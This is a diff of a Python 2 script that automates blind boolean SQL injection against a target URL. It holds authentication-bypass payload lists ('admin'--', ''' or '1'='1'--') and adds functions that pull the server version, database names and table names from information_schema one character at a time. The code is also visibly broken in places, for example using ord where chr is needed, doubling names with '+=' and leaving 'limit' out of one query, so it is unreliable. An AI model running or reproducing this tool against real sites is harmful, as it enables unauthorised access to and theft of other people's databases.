@@ -16,7 +16,7 @@ l_bypass        = ["admin'--", "admin'#", "1--", "1 or 1 = 1--", "' or '1'='1'--
                     "' and '1'='2'--", "1/* comment */"]
 l_bypass2       = ["admin')--", "admin')#", "1)--", "1) or 1 = 1--", "') or '1'='1'--", "-1) and 1=2",
                     "') and '1'='2'--"]
-alphabet        = "abcdefghijklmnopqrstuvwxyz"
+#alphabet        = "abcdefghijklmnopqrstuvwxyz"
 dump            = {}
 
 # --------- Main function option parsing ----------
@@ -29,9 +29,10 @@ python sql.py TODO include args"""
     try:
         parser.add_option("-u", "--url", action="store", type=str, dest="URL", help="The target url to inject")
         parser.add_option("-p", "--payload", action="store", type=str, dest="PAYLOAD", help="The payload used to trigger the injection")
+        parser.add_option("-b", "--bypass", action="store", type=str, dest="BYPASS", help="The bypass used the injection")
         parser.add_option("-e", "--enum", action="store_true", dest="ENUM", help="Enumerate databases, tables columns")
         parser.add_option("-D", "--dump", action="store_true", dest="DUMP", help="Dump the chosen database")
-        parser.add_option("-b", "--database", action="store", type=str, dest="DATABASE", help="The database to dump")
+        parser.add_option("-d", "--database", action="store", type=str, dest="DATABASE", help="The database to dump")
     except optparse.AmbiguousOptionError as ambiguous:
         print("Ambiguous option: " + ambiguous)
     except optparse.BadOptionError as bad_option:
@@ -42,19 +43,15 @@ python sql.py TODO include args"""
 
     url                 = options.URL
     payload             = options.PAYLOAD
+    bypass              = options.BYPASS
     enum                = options.ENUM
     dump                = options.DUMP
     database            = options.DATABASE
 
     # TODO algo principal ici
     # Enumerer le nombre de colonnes de la table courante pour l'injection
-    # Trouver un bypass
-    if not bypass_detect:
-        bypass = find_bypass(url)
-    else :
-        bypass = bypass_detect
     # Trouver la version du serveur SQL
-    sql_version(url, bypass)
+    sql_version(url,payload, bypass)
     eunum_databases(url, payload, bypass)
     # Récupérer la base de données courantes et les autres bases de données
     # Pour chaque base database
@@ -69,6 +66,7 @@ def sql_version(url, payload, bypass):
         Is the base request for finding the database version number
         uri = url + "' and "  + "substring(@@version,1,1)>=" + str(i) + " or '"
     '''
+    server_version = 0
     for sql_version in range(4,7):
         uri = url + str(payload)  + "substring(@@version,1,1)>=" + str(sql_version) + str(bypass)
         server_response = request_handler(uri)
@@ -119,9 +117,10 @@ def eunum_databases(url, payload, bypass):
                 # Count how many chars in db name, we assume the database name to be less than 128 characters
                 while (database_letter_count < 128):
                     # uri = url + "' and substring((select schema_name from information_schema.schemata limit " + str(database_number) + ",1),"+ str(database_letter_count) + ",1)>0" + bypass
-                    uri = url + str(payload) + "substring((select schema_name from information_schema.schemata limit " + str(database_number) + ",1),"+ str(database_letter_count) + ",1)>0" + bypass
+                    uri = url + str(payload) + "substring((select schema_name from information_schema.schemata limit " + str(database_number) + ",1),"+ str(database_letter_count) + ",1)>=0" + bypass
                     server_response = request_handler(uri)
                     server_response_status = validate_request(server_response)
+                    print server_response_status, database_letter_count
 
                     if server_response_status is False:
                         print 'Database ' + str(database_number) + ': has ' + str(database_letter_count) + ' letters'
@@ -132,8 +131,8 @@ def eunum_databases(url, payload, bypass):
 
                             # Loop in ascii range to guess each character
                             for database_letter in range(1,128):
-                                # uri = url + "' and ascii(substring((select schema_name from information_schema.schemata limit " + str(database_number) + ",1)," + str(database_letter_count) + ",1))>=" + str(database_letter) + bypass
                                 uri = url + str(payload) + "ascii(substring((select schema_name from information_schema.schemata limit " + str(database_number) + ",1)," + str(database_letter_count) + ",1))>=" + str(database_letter) + bypass
+
                                 server_response = request_handler(uri)
                                 server_response_status = validate_request(server_response)
 
@@ -141,17 +140,76 @@ def eunum_databases(url, payload, bypass):
                                 if server_response_status is False:
                                     database_name = database_name + str(ord(database_letter - 1))
 
-                    elif server_response_status is True:
-                        database_letter_count = database_letter_count + 1
+                    # elif server_response_status is True:
+                    database_letter_count = database_letter_count + 1
 
-                l_database_name += database_name
+                database_name += database_name
+                print database_name
 
         elif server_response_status is True:
             database_increment = database_increment + 1
 
 # --------- Enumerate database tables ----------
 def enum_tables(url, payload, bypass, database):
-    pass
+        '''
+            Request working on leettime
+            Is the base request for finding the number of databases, how many characters are in each database name
+            ' and substring((select table_name from information_schema.tables where table_schema != 'mysql' and table_schema != 'information_schema' limit 0,1),1,1)>=0 or '
+
+            TODO
+                Handle the case where database increment starts at 1 so first test will be false, second true, n true, o false...
+            TODO
+        '''
+
+        tables_increment = 0
+
+        # Count how many databases, we assume there are less than 64 databases
+        while (tables_increment < 64):
+            # uri = url + "' and substring((select schema_name from information_schema.schemata limit " + str(database_increment) + ",1),1,1)>=0" + bypass
+            uri = url + str(payload) + "substring((select table_name from information_schema.tables where table_schema != 'mysql' and table_schema != 'information_schema' limit " + str(tables_increment) + ",1),1,1)>=0" + bypass
+            server_response = request_handler(uri)
+            server_response_status = validate_request(server_response)
+
+            # If status is false then we know the number of databases
+            if server_response_status is False:
+                print 'Found ' + str(tables_increment) + ' Tables'
+
+                # Count how many letters in each database name
+                for table_number in range(0,tables_increment):
+                    table_letter_count = 1
+
+                    # Count how many chars in db name, we assume the database name to be less than 128 characters
+                    while (table_letter_count < 128):
+                        # uri = url + "' and substring((select schema_name from information_schema.schemata limit " + str(database_number) + ",1),"+ str(database_letter_count) + ",1)>0" + bypass
+                        uri = url + str(payload) + "substring((select table_name from information_schema.tables where table_schema != 'mysql' and table_schema != 'information_schema' " + str(table_number) + ",1),"+ str(table_letter_count) + ",1)>0" + bypass
+                        server_response = request_handler(uri)
+                        server_response_status = validate_request(server_response)
+
+                        if server_response_status is False:
+                            print 'Table ' + str(table_number) + ': has ' + str(table_letter_count) + ' letters'
+                            table_name = ""
+
+                            # Get the databases names
+                            for table_letter_count in range(1,table_letter_count):
+
+                                # Loop in ascii range to guess each character
+                                for table_letter in range(1,128):
+                                    # uri = url + "' and ascii(substring((select schema_name from information_schema.schemata limit " + str(database_number) + ",1)," + str(database_letter_count) + ",1))>=" + str(database_letter) + bypass
+                                    uri = url + str(payload) + "ascii(substring((select table_name from information_schema.tables where table_schema != 'mysql' and table_schema != 'information_schema' limit " + str(table_number) + ",1)," + str(table_letter_count) + ",1))>=" + str(table_letter) + bypass
+                                    server_response = request_handler(uri)
+                                    server_response_status = validate_request(server_response)
+
+                                    # If status is false then database_letter - 1 was the n-th char of the database name
+                                    if server_response_status is False:
+                                        table_name = table_name + str(ord(table_letter - 1))
+
+                        elif server_response_status is True:
+                            table_letter_count = table_letter_count + 1
+
+                    table_name += table_name
+
+            elif server_response_status is True:
+                tables_increment = tables_increment + 1
 
 # --------- Dump the database ----------
 def exfiltrate_data(url, payload, bypass, database):
@@ -177,6 +235,7 @@ def validate_request(page):
     if page == "":
         print "Error: request returned empty page!"
 
+# --------- Display -----------------------------------
 def display_database_struct(dump):
     for database, table_dictionnary in dump.iteritems():
         print "Database: " + str(database)
@@ -199,20 +258,3 @@ def display_database_dump(dump):
 
 if __name__ == "__main__":
     main()
-
-
-
-"""
-Test utilisation de dual
-   dual = ""
-    for i in range (1,6):
-        dual = dual + '_'
-        urli = url + "' and " + "(select 1 from dual where user() LIKE '" + dual + "')" + " or '"
-        print urli
-        page = requests.get(urli)
-        htmlpage_dual = page.content
-        print "Page 2\n", htmlpage_dual, "\n"
-        if htmlpage == htmlpage_dual:
-            break
-    print i
-        """
